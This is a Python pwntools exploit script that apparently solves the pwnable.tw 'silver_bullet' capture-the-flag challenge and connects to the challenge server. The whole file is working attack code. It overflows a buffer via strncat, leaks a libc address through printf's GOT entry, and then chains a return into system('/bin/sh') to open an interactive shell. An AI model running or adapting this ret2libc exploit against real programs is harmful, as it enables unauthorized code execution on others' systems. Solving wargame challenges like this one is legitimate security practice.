#!/usr/bin/env python3
import re
from pwn import *
import pwnlib.shellcraft
import time

libc = ELF('./libc_32.so.6')
elf = ELF('./silver_bullet')
debug = False

c = 0
if debug:
    pwn_file="./ld-2.23.so --library-path ./ ./silver_bullet"
    c = process(pwn_file.split(), env={'LD_PRELOAD': './libc_32.so.6'})
    print(c.libs())
else:
    c = remote('chall.pwnable.tw', 10103)

context.os='linux'
context.terminal = ['tmux', 'splitw', '-h']
if debug:
    elf_path = c.cwd + c.argv[3].decode().strip('.')
    while not elf_path in c.libs():
        time.sleep(0.5)
        print('wait loading')

    gdbcmd = '''source /usr/share/peda/peda.py
    file ./silver_bullet
    info proc mappings
    set $elf_base={}
    b *$elf_base+0xa18

    c

    # puts
    # b *0x80484a8

    bt
    '''.format(hex(c.libs()[elf_path]))
    gdb.attach(c, gdbcmd)
context.log_level ='debug'

def send_menuln(command):
    c.recvuntil(':')
    c.sendline(command)


def send_menu(command):
    c.recvuntil(':')
    c.send(command)

def overflow():
    # overflow use strncat
    send_menu('1')
    send_menu(0x2f * 'a')

    send_menu('2')
    send_menu('a')

# overflow ones
overflow()

# have one chance to write 0x2f byte
# make attack can kill boss
# leak libc address

printf = elf.plt['printf']
main = elf.symbols['main']
fmt_str = 0x8048bb3 # print %s

send_menu('2')
send_menu(flat({0x0: p32(0x7fffffff), 0x7: printf, 0x7 + 4: main, 0x7 + 8: fmt_str, 0x7 + 12: elf.got['printf']},length=0x7 + 4 * 4))
send_menu('3')

c.recvuntil('!!')
c.recvuntil(': ')
# Sometimes it fails, please try again
libc_base = u32(c.recvuntil('\n')[:4]) - libc.symbols['printf']
print(hex(libc_base))

# round 2 overflow again
# get shell
overflow()
system = libc_base + libc.symbols['system']
sh_str = p32(libc_base + 0x158e8b ) # /bin/sh

send_menu('2')
send_menu(flat({0x0: p32(0x7fffffff), 0x7: system, 0x7 + 4: sh_str * 2},length=0x7 + 4 * 4))

send_menu('3')

c.interactive()
c.close()
